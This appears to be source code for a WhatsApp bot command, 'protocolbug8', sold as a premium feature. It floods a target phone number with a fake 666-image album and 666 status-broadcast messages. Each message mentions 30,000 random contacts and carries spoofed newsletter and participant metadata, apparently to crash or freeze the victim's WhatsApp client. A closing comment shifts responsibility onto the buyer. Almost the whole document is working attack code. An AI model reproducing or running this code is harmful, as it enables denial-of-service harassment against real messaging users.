// Function 
async function protocolbug8(isTarget, mention) {
  const photo = {
    image: imgCrL,
    caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
  };

  const album = await generateWAMessageFromContent(isTarget, {
    albumMessage: {
      expectedImageCount: 666, // ubah ke 100 kalau g ke kirim
      expectedVideoCount: 0
    }
  }, {
    userJid: isTarget,
    upload: client.waUploadToServer
  });

  await client.relayMessage(isTarget, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) { // ubah ke 100 / 10 kalau g ke kirim
    const msg = await generateWAMessage(isTarget, photo, {
      upload: client.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
      "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "Tama Ryuichi | I'm Beginner",
        newsletterJid: "0@newsletter",
        serverMessageId: 1
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    await client.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [isTarget],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: isTarget }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await client.relayMessage(isTarget, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

// Case
case 'protocolbug8': {
    if (!isPremium) return exreply("*Access Denied: Premium Users Only!*");
    if (!q) return exreply(`Example Usage:\n .${command} 62xx / @tag`);
    let jidx = q.replace(/[^0-9]/g, "");
    let isTarget = `${jidx}@s.whatsapp.net`;
    exreply(`*Success! ${command} sent to ${isTarget}*`);
    //Paramater
    await protocolbug8(isTarget, true)
    
  console.log(chalk.red.bold("Loop Finished! All messages are processed."))
}
break

/*

 Konsekuensi Di Tanggung Penuh Pembeli / Pengguna. 
 ~ Tama
 
*/